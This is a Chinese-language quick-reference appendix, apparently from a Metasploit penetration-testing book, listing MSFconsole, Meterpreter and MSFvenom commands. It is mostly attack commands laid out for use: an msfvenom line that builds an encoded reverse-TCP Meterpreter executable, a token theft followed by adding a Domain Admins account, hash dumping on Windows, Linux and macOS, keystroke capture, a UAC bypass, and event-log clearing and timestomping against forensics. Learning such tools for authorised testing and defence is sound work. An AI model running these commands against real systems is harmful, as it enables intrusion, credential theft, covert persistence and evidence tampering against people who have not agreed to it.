# 速查表

为方便起见，本附录列出了 Metasploit 各种接口和工具中最常用的命令及语法。

## MSFconsole

| 命令 | 说明 |
|------|------|
| `check` | 判断目标是否容易受到攻击。 |
| `db_connect name` | 创建并连接到一个数据库（例如：`db_connect autopwn`）。 |
| `db_create name` | 创建一个数据库，用于基于数据库的攻击（例如：`db_create autopwn`）。 |
| `db_destroy` | 删除当前数据库。 |
| `db_destroy user:password@host:port/database` | 使用高级选项删除数据库。 |
| `db_nmap` | 运行 Nmap 并将结果存入数据库；该命令支持普通 Nmap 语法，如 `-sT -v -Pn`。 |
| `exploit` | 执行模块或漏洞利用并攻击目标。 |
| `exploit -e encoder` | 指定要使用的载荷编码器（例如：`exploit -e shikata_ga_nai`）。 |
| `exploit -h` | 显示 exploit 命令的帮助信息。 |
| `exploit -j` | 在作业上下文中运行漏洞利用（将在后台运行）。 |
| `exploit -z` | 成功利用后不与会话交互。 |
| `info` | 加载特定漏洞利用或模块的详细信息。 |
| `LHOST` | 目标可访问的本地主机 IP 地址；不在本地网络时通常为公网 IP。常用于反向 shell。 |
| `RHOST` | 远程主机或目标主机。 |
| `search name` | 在框架内搜索漏洞利用或模块。 |
| `sessions -c cmd` | 在所有活跃 Meterpreter 会话上执行命令。 |
| `sessions -K` | 杀死所有活跃会话。 |
| `sessions -l` | 列出可用会话（处理多个 shell 时使用）。 |
| `sessions -l -v` | 列出所有可用会话并显示详细字段，例如攻击系统时使用的漏洞。 |
| `sessions -u sessionID` | 将普通 Win32 shell 升级为 Meterpreter 控制台。 |
| `set function` | 设置特定值（例如 LHOST 或 RHOST）。 |
| `setg function` | 全局设置特定值（例如 LHOST 或 RHOST）。 |
| `set payload payload` | 指定要使用的载荷。 |
| `set target num` | 如果知道操作系统和服务包，指定特定的目标索引。 |
| `show advanced` | 显示高级选项。 |
| `show auxiliary` | 显示框架内的所有辅助模块。 |
| `show exploits` | 显示框架内的所有漏洞利用模块。 |
| `show options` | 显示模块或漏洞利用可用的选项。 |
| `show payloads` | 显示框架内的所有载荷。 |
| `show targets` | 显示漏洞利用支持的平台。 |
| `use name` | 加载一个漏洞利用或模块（例如：`use windows/smb/psexec`）。 |

## Meterpreter

| 命令 | 说明 |
|------|------|
| `add_group_user "Domain Admins" username -h ip` | 将用户名添加到远程目标上的 Domain Administrators 组。 |
| `add_user username password -h ip` | 在远程目标上添加用户。 |
| `background` | 将当前 Meterpreter shell 置于后台运行。 |
| `clear ev` | 清除目标机器上的事件日志。 |
| `download file` | 从目标下载文件。 |
| `drop_token` | 停止模拟当前令牌。 |
| `execute -f cmd.exe -i` | 执行 cmd.exe 并与之交互。 |
| `execute -f cmd.exe -i -H -t` | 使用所有可用令牌执行 cmd.exe，并使其成为隐藏进程。 |
| `execute -f cmd.exe -i -t` | 使用所有可用令牌执行 cmd.exe。 |
| `getprivs` | 在目标上获取尽可能多的权限。 |
| `getsystem` | 尝试通过多个攻击向量将权限提升到 SYSTEM 级别。 |
| `hashdump` | 转储目标上的所有哈希。 |
| `help` | 打开 Meterpreter 使用帮助。 |
| `impersonate_token DOMAIN_NAME\\USERNAME` | 模拟目标上可用的令牌。 |
| `keyscan_dump` | 转储在目标上捕获的远程按键。 |
| `keyscan_start` | 开始在远程目标上嗅探按键。 |
| `keyscan_stop` | 停止在远程目标上嗅探按键。 |
| `list_tokens -g` | 按组列出目标上可用的令牌。 |
| `list_tokens -u` | 按用户列出目标上可用的令牌。 |
| `ls` | 列出目标上的文件和文件夹。 |
| `migrate PID` | 迁移到特定的进程 ID；PID 是通过 `ps` 命令获得的目标进程 ID。 |
| `ps` | 显示所有正在运行的进程及每个进程关联的账户。 |
| `reboot` | 重启目标机器。 |
| `reg command` | 在目标注册表中交互、创建、删除、查询和设置值。 |
| `rev2self` | 恢复为你最初入侵目标时使用的原始用户。 |
| `screenshot` | 对目标屏幕进行截图。 |
| `setdesktop number` | 根据登录的用户切换到不同的桌面。 |
| `shell` | 使用所有可用令牌进入交互式 shell。 |
| `sniffer_dump interfaceID pcapname` | 在远程目标上开始嗅探。 |
| `sniffer_interfaces` | 列出目标上可用的接口。 |
| `sniffer_start interfaceID packet-buffer` | 使用特定的数据包缓冲区范围开始嗅探。 |
| `sniffer_stats interfaceID` | 从正在嗅探的接口获取统计信息。 |
| `sniffer_stop interfaceID` | 停止嗅探器。 |
| `steal_token PID` | 窃取给定进程可用的令牌并模拟该令牌。 |
| `sysinfo` | 显示被攻陷目标的系统信息。 |
| `timestamp` | 更改文件属性（如创建日期），作为反取证措施。 |
| `uictl enable keyboard/mouse` | 控制键盘和/或鼠标。 |
| `upload file` | 上传文件到目标。 |
| `use incognito` | 加载 Incognito 功能，用于在目标机器上窃取和模拟令牌。 |
| `use priv` | 加载权限扩展，用于扩展 Meterpreter 库。 |
| `use sniffer` | 加载嗅探器模块。 |

## MSFvenom

利用 MSFvenom（一体化套件）创建并编码载荷：

```bash
msfvenom -p windows/meterpreter/reverse_tcp --format exe --encoder x86/shikata_ga_nai LHOST=172.16.1.32 LPORT=443 > msf.exe
[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)
```

这条单行命令将创建一个载荷，并自动生成可执行格式的文件。

## Meterpreter 后渗透利用

使用 Meterpreter 提升基于 Windows 的系统上的权限：

```bash
meterpreter > use priv
meterpreter > getsystem
```

从给定的进程 ID 窃取域管理员令牌，添加域账户，然后将该令牌添加到 Domain Admins 组：

```bash
meterpreter > ps
meterpreter > steal_token 1784
meterpreter > shell

C:\Windows\system32> net user metasploit p@55w0rd /ADD /DOMAIN
C:\Windows\system32> net group "Domain Admins" metasploit /ADD /DOMAIN
```

从 SAM 数据库中转储密码哈希：

```bash
meterpreter > use priv
meterpreter > getsystem
meterpreter > hashdump
```

如果 `getsystem` 和 `hashdump` 抛出异常，可能需要迁移到以 SYSTEM 身份运行的进程。

自动迁移到其他进程：

```bash
meterpreter > run migrate
```

在目标机器上从特定进程中捕获按键：

```bash
meterpreter > ps
meterpreter > migrate 1436
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop
```

使用 Incognito 模拟管理员：

```bash
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > use priv
meterpreter > getsystem
meterpreter > list_tokens -u
meterpreter > impersonate_token IHAzSECURITY\\Administrator
```

进入当前 Meterpreter 控制台会话的命令 shell：

```bash
meterpreter > shell
```

在目标机器上获取远程 GUI（已弃用，但仍可使用）：

```bash
meterpreter > run vnc
```

将当前运行的 Meterpreter 控制台置于后台：

```bash
meterpreter > background
```

绕过 Windows 用户账户控制（UAC）：

```bash
meterpreter > run post/windows/escalate/bypassuac
```

在 macOS 系统上转储哈希：

```bash
meterpreter > run post/osx/gather/hashdump
```

在 Linux 系统上转储哈希：

```bash
meterpreter > run post/linux/gather/hashdump
```